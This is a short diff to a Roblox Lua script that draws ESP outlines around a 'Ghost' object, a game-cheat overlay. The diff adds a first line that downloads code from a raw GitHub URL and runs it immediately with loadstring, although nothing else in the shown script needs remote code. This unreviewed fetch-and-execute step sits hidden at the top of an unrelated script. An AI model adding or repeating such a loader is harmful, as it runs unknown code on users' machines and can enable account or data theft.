@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/amarhitranjanbiruly/kk/refs/heads/main/gh'))()
+
 -- ESP for workspace.Ghost (Fixed with per-part outlines)
 local Camera = workspace.CurrentCamera
 local Players = game:GetService("Players")
